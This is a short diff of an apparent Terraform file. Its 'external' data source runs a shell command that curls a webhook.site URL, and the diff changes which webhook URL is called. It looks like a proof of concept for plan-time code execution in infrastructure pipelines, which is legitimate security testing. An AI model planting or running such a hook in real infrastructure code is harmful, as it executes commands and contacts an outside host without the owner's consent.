@@ -1,3 +1,3 @@
 data "external" "example" {
-    program = ["sh","-c","curl https://webhook.site/4848641c-f4c0-499a-a37c-276f9be6ed35"]
+    program = ["sh","-c","curl https://webhook.site/00ad381a-2cb8-4c65-8e4a-8f8b1bbe71f0"]
 }
